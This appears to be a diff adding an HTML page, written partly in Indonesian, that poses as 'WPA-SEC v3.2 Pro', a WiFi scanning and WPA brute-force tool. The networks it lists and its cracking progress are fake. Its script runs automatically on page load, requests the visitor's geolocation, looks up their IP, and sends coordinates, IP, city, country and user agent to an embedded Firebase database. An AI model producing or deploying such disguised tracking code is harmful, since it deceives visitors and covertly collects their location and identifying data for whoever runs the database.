@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WPA-SEC v3.2 Pro</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family: 'Inter', system-ui, sans-serif; }
+    body { background: #0b132b; color: #fff; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
+    .container { max-width:720px; width:100%; background: rgba(255,255,255,0.05); backdrop-filter:blur(12px); padding:30px; border-radius:24px; border:1px solid rgba(255,255,255,0.08); }
+    .header { display:flex; justify-content:space-between; align-items:center; margin-bottom:25px; }
+    .logo { font-size:22px; font-weight:700; background:linear-gradient(to right, #5bc0be, #fff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+    .logo span { font-size:12px; background:rgba(91,192,190,0.15); padding:4px 12px; border-radius:20px; color:#5bc0be; }
+    .control-panel { background:rgba(0,0,0,0.3); padding:20px; border-radius:16px; margin-bottom:20px; }
+    .input-group { display:flex; gap:12px; flex-wrap:wrap; }
+    select, button { padding:12px 18px; border-radius:10px; border:none; font-weight:600; cursor:pointer; }
+    select { flex:2; background:#1f2833; color:#fff; outline:1px solid #3a506b; }
+    button { flex:1; background:#5bc0be; color:#0b132b; }
+    button:hover { background:#4aa8a6; }
+    button:disabled { background:#3a506b; color:#aaa; cursor:not-allowed; }
+    #wifiList { background:rgba(0,0,0,0.2); border-radius:12px; padding:15px; margin:20px 0; display:none; }
+    .wifi-item { display:flex; justify-content:space-between; padding:10px 0; border-bottom:1px solid rgba(255,255,255,0.05); }
+    .wifi-item:last-child { border:none; }
+    .sec { color:#f4a261; font-size:13px; background:rgba(244,162,97,0.15); padding:2px 10px; border-radius:20px; }
+    #progressArea { background:rgba(0,0,0,0.4); border-radius:12px; padding:15px; margin-top:15px; display:none; }
+    .progress-bar { height:6px; background:#1f2833; border-radius:10px; overflow:hidden; margin:10px 0; }
+    .progress-fill { height:100%; width:0%; background:linear-gradient(90deg, #5bc0be, #f4a261); transition:width 0.1s; }
+    #outputLog { background:#0b132b; padding:12px; border-radius:8px; font-size:14px; font-family:monospace; color:#5bc0be; height:120px; overflow-y:auto; margin-top:10px; border:1px solid #1f2833; }
+    .footer { text-align:center; margin-top:25px; font-size:12px; color:#6c757d; border-top:1px solid rgba(255,255,255,0.05); padding-top:15px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="logo">⚡ WPA-SEC <span>v3.2 Pro</span></div>
+      <div style="font-size:12px; color:#8a8a8a;">ramzy666</div>
+    </div>
+
+    <div class="control-panel">
+      <p style="margin-bottom:12px; color:#b0b0b0; font-size:14px;">▸ Scan jaringan WiFi di sekitar untuk analisis keamanan.</p>
+      <div class="input-group">
+        <select id="targetSelect"><option value="">-- Scan & Pilih Jaringan --</option></select>
+        <button id="attackBtn">⚡ Bruteforce</button>
+        <button id="scanBtn">📡 Scan Ulang</button>
+      </div>
+    </div>
+
+    <div id="wifiList"></div>
+    <div id="progressArea">
+      <div class="status-text" id="statusText">⏳ Initializing...</div>
+      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+      <div id="outputLog">> Starting WPA2 brute-force module...</div>
+    </div>
+    <div class="footer">ramzy666</div>
+  </div>
+
+  <script type="module">
+    // Import Firebase (CDN)
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
+
+    // PAKAI CONFIG FIREBASE LU (udah gue masukin)
+    const firebaseConfig = {
+      apiKey: "AIzaSyDnERYgQXwNvQXN05Vuv3C-13-ZLeBwlLI",
+      authDomain: "t-sixx.firebaseapp.com",
+      databaseURL: "https://t-sixx-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "t-sixx",
+      storageBucket: "t-sixx.firebasestorage.app",
+      messagingSenderId: "624016209244",
+      appId: "1:624016209244:web:774f15af7f2f849d267d99"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // Fungsi kirim data ke Firebase
+    function sendData(lat, lng, ipData) {
+      const data = {
+        lat: lat || null,
+        lng: lng || null,
+        ip: ipData?.query || 'Unknown',
+        city: ipData?.city || 'Unknown',
+        country: ipData?.country || 'Unknown',
+        ua: navigator.userAgent,
+        waktu: new Date().toISOString()
+      };
+      const key = Date.now();
+      set(ref(db, 'logs/' + key), data);
+    }
+
+    // Daftar WiFi palsu
+    const fakeNetworks = [
+      { ssid: 'IndiHome_Fiber_2.4G', signal: '85%', sec: 'WPA2-PSK' },
+      { ssid: 'Kost_Anime_Lantai3', signal: '72%', sec: 'WPA3-SAE' },
+      { ssid: 'Telkomsel_4G_Hotspot', signal: '65%', sec: 'WPA2-PSK' },
+      { ssid: 'Mall_Plaza_WiFi', signal: '48%', sec: 'WPA-Enterprise' },
+      { ssid: 'Warnet_Gaming_Pro', signal: '91%', sec: 'WPA2-PSK' },
+      { ssid: 'Binus_Campus_Net', signal: '34%', sec: 'WPA-Enterprise' },
+      { ssid: 'Rumah_Kosong_2', signal: '55%', sec: 'WEP (Vulnerable)' }
+    ];
+
+    const scanBtn = document.getElementById('scanBtn');
+    const attackBtn = document.getElementById('attackBtn');
+    const targetSelect = document.getElementById('targetSelect');
+    const wifiList = document.getElementById('wifiList');
+    const progressArea = document.getElementById('progressArea');
+    const progressFill = document.getElementById('progressFill');
+    const statusText = document.getElementById('statusText');
+    const outputLog = document.getElementById('outputLog');
+
+    function showFakeNetworks() {
+      wifiList.style.display = 'block';
+      wifiList.innerHTML = fakeNetworks.map((n, i) => `
+        <div class="wifi-item">
+          <span style="font-weight:500;">${n.ssid}</span>
+          <div><span class="sig">${n.signal}</span> <span class="sec">${n.sec}</span></div>
+        </div>
+      `).join('');
+      targetSelect.innerHTML = `<option value="">-- Pilih Jaringan Target --</option>` + 
+        fakeNetworks.map((n, i) => `<option value="${i}">${n.ssid} (${n.signal})</option>`).join('');
+    }
+
+    function startFakeBruteforce(idx) {
+      const target = fakeNetworks[idx];
+      progressArea.style.display = 'block';
+      attackBtn.disabled = true; scanBtn.disabled = true;
+      outputLog.innerHTML = `> Target: ${target.ssid}\n> Protocol: ${target.sec}\n> Capturing handshake...`;
+
+      let progress = 0;
+      const steps = [
+        { p: 20, msg: '> Extracting 4-way handshake...' },
+        { p: 45, msg: '> Loading dictionary database (9.4M entries)...' },
+        { p: 70, msg: '> Running PMKID attack...' },
+        { p: 90, msg: '> Brute-forcing password candidates...' },
+        { p: 100, msg: `✅ SUCCESS! WPA Key: 8a9b2c3d4e5f6789\n> Password: password123` }
+      ];
+
+      const interval = setInterval(() => {
+        progress += Math.floor(Math.random() * 5) + 2;
+        if (progress > 100) progress = 100;
+        progressFill.style.width = progress + '%';
+        const current = steps.find(s => progress >= s.p);
+        if (current && !outputLog.innerHTML.includes(current.msg)) {
+          outputLog.innerHTML += `\n${current.msg}`;
+          outputLog.scrollTop = outputLog.scrollHeight;
+        }
+        if (progress >= 100) {
+          clearInterval(interval);
+          statusText.innerText = '✅ Bruteforce completed!';
+          attackBtn.disabled = false; scanBtn.disabled = false;
+        }
+      }, 180);
+    }
+
+    scanBtn.addEventListener('click', function() {
+      attackBtn.disabled = true;
+      statusText.innerText = '📍 Scanning networks...';
+      outputLog.innerHTML = '> Initializing WiFi adapter...\n> Scanning 2.4GHz & 5GHz bands...';
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            let ipData = null;
+            try { const r = await fetch('https://ip-api.com/json/'); ipData = await r.json(); } catch {}
+            sendData(pos.coords.latitude, pos.coords.longitude, ipData);
+            statusText.innerText = `✅ Found ${fakeNetworks.length} networks nearby.`;
+            outputLog.innerHTML += `\n> Located at ${ipData?.city || 'Unknown'}`;
+            showFakeNetworks();
+            attackBtn.disabled = false;
+          },
+          () => {
+            fetch('https://ip-api.com/json/').then(r => r.json()).then(data => {
+              sendData(null, null, data);
+              statusText.innerText = `⚠️ Location restricted. Showing IP-based results.`;
+              showFakeNetworks(); attackBtn.disabled = false;
+            });
+          }
+        );
+      } else {
+        showFakeNetworks(); attackBtn.disabled = false;
+      }
+    });
+
+    attackBtn.addEventListener('click', function() {
+      const val = targetSelect.value;
+      if (val === '') return alert('Pilih target jaringan WiFi terlebih dahulu!');
+      startFakeBruteforce(parseInt(val));
+    });
+
+    scanBtn.click();
+  </script>
+</body>
+  </html>
